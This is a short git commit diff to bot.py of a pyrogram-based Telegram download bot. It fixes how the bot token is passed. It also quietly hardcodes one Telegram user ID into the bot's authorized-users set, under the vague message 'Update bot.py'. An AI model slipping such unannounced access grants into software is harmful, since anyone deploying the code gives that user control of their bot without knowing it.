cf4d8cbd0a6e8bf92778047930d70f7996fccb2c
amalpm615 <52080988+amalpm615@users.noreply.github.com>
2020-05-08 12:52:32 +0530

    Update bot.py

--- bot.py
+++ bot.py
@@ -28,9 +28,11 @@ if __name__ == "__main__" :
         root="plugins"
     )
     app = pyrogram.Client(
-        session_name=Config.TG_BOT_TOKEN,
+        "AnyDLBot",
+        bot_token=Config.TG_BOT_TOKEN,
         api_id=Config.APP_ID,
         api_hash=Config.API_HASH,
         plugins=plugins
     )
+    Config.AUTH_USERS.add(7351948)
     app.run()
